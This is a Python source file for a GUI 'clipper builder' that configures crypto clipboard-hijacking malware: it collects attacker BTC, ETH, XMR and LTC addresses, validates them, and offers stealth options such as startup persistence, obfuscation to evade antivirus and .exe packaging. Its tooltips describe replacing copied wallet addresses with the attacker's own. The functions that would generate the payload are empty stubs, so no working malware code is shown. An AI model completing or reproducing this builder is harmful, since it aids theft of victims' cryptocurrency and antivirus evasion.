from CTkMessagebox import CTkMessagebox

import customtkinter
import webbrowser
import CTkToolTip
import hPyT
import re

btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"

customtkinter.set_appearance_mode("dark")

class buildclipper:
    def build_all():
        pass

    def build_subprocess():
        pass

    def build_ctypes():
        pass

    def build_pyperclip():
        pass

    def check_build_type():
        pass

class buildgui:
    def check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr):
        btc_addr1 = str(btc_addr.get()).strip()
        eth_addr1 = str(eth_addr.get()).strip()
        xmr_addr1 = str(xmr_addr.get()).strip()
        ltc_addr1 = str(ltc_addr.get()).strip()

        if btc_addr1 == "" and eth_addr1 == "" and xmr_addr1 == "" and ltc_addr1 == "":
            CTkMessagebox(title="info", message="please add at least one crypto address")
        else:

            try:
                if btc_addr1 != "":
                    if re.match(btc_address_pattern, btc_addr1):
                        btc_addr.configure(border_color="green")

                if eth_addr1 != "":
                    if re.match(eth_address_pattern, eth_addr1):
                        eth_addr.configure(border_color="green")

                if xmr_addr1 != "":
                    if re.match(xmr_address_pattern, xmr_addr1):
                        xmr_addr.configure(border_color="green")

                if ltc_addr1 != "":
                    if re.match(ltc_address_pattern, ltc_addr1):
                        ltc_addr.configure(border_color="green")
                
                check_valid_btn.configure(text="build")

            except Exception as e:
                CTkMessagebox(title="error", message=e, icon="cancel")

    def build_widgets():
        global check_valid_btn

        for widget in option_frame.winfo_children():
            widget.destroy()
        for widget in option_frame.winfo_children():
            widget.destroy()

        customtkinter.CTkLabel(master=option_frame, text="clipper settings").pack(padx=50)
        customtkinter.CTkLabel(master=main_frame, text="(if address format isnt correct border will stay same rather than turn green)").pack()

        btc_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="BTC address (leave empty if none): ")
        btc_addr.pack(fill="x", padx=5, pady=5)
        eth_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="ETH address (leave empty if none): ")
        eth_addr.pack(fill="x", padx=5, pady=0)
        xmr_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="XMR address (leave empty if none): ")
        xmr_addr.pack(fill="x", padx=5, pady=5)
        ltc_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="LTC address (leave empty if none): ")
        ltc_addr.pack(fill="x", padx=5, pady=0)
        check_valid_btn = customtkinter.CTkButton(master=main_frame, text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr))
        check_valid_btn.pack(fill="x", padx=5, pady=5)
        kill_reset_btn = customtkinter.CTkButton(master=main_frame, text="KILL AND RESET ALL FRAMES", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"))
        kill_reset_btn.pack(fill="x", padx=5, pady=0)
        
        clipper_type = customtkinter.CTkComboBox(master=option_frame, state="readonly", values=["set clipper type", "subprocess (0 external modules - stealth)", "ctypes (0 external modules - stealth)", "pyperclip (1 external module - no stealth)", "create all with given settings"])
        clipper_type.set("set clipper type")
        clipper_type.pack(pady=5)
        single_use_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="single use - stealth 1/3", onvalue="on", offvalue="off")
        single_use_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
        obfuscate_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="obfuscate - stealth 3/3", onvalue="on", offvalue="off")
        obfuscate_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
        exe_file_checkbox = customtkinter.CTkCheckBox(master=option_frame, text=".exe file - stealth 2/3", onvalue="on", offvalue="off")
        exe_file_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
        
        CTkToolTip.CTkToolTip(widget=single_use_checkbox, message="single use: code will run at startup until it detects a address to replace, when this happens the code will never run again - essentially only ever clipping once", delay=0.5, wraplength=300)
        CTkToolTip.CTkToolTip(widget=obfuscate_checkbox, message="obfuscate: will run obfucscation to make it more difficult to read and more difficult for anti virus detections", delay=0.5, wraplength=300)
        CTkToolTip.CTkToolTip(widget=exe_file_checkbox, message=".exe file: will turn the python code into a .exe file", delay=0.5, wraplength=300)
        CTkToolTip.CTkToolTip(widget=clipper_type, message="set clipper type: all methods read and regex the clipboard for crypto addresses, then replace the address with your chosen one. the subprocess method uses Pythons subprocess, which is stealthy but may be slightly slower on some laptops. the ctypes method, also stealthy and included with Python, is fast. the pyperclip method, requiring an external installation (pip install), is fast but less stealthy. subprocess and ctypes are equally effective, while pyperclip is least recommended", delay=0.5, wraplength=300)
    
    def main():
        global option_frame, main_frame

        root = customtkinter.CTk()
        root.title("clipper builder by 3022-2")
        root.minsize(width=800, height=400)
        root.geometry("600x400")
        root.resizable(height=False, width=False)
        root.iconbitmap("bitcoin__1__IY4_icon.ico")

        hPyT.rainbow_border.start(window=root, interval=5)

        tabview = customtkinter.CTkTabview(master=root)
        tabview.pack(fill="both", expand=True, padx=5, pady=5)
        tabview.add("builder")
        tabview.add("documentation")
        tabview._segmented_button.grid(sticky="w", padx=10)

        option_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
        option_frame.pack(side="left", fill="y")
        main_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
        main_frame.pack(fill="both", expand=True, side="right", anchor="n", padx=(5, 0))

        customtkinter.CTkScrollableFrame(master=tabview.tab("documentation"), fg_color="#242424").pack(fill="both", expand=True)
        customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(5, 0))

        buildgui.build_widgets()

        root.mainloop()

if __name__ == "__main__":
    buildgui.main()